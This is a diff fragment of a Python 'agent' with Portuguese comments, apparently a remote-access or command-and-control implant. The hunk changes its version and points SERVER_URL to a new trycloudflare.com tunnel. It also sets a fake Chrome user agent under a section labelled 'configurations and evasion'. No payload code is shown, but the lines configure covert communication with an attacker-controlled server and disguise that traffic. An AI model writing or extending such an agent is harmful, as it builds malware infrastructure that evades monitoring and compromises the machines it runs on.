@@ -37,7 +37,7 @@ except ImportError:
 
 # --- CONFIGURAÇÕES E EVASÃO ---
 AGENT_VERSION = "2.2" # <-- VERSÃO DO AGENTE ATUALIZADA
-SERVER_URL = "https://additional-mega-establishment-requesting.trycloudflare.com" # <-- MANTENHA A SUA URL
+SERVER_URL = "https://newsletter-anime-realistic-wishlist.trycloudflare.com" # <-- MANTENHA A SUA URL
 AGENT_ID = None
 FAKE_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
 HTTP_HEADERS = {'User-Agent': FAKE_USER_AGENT}
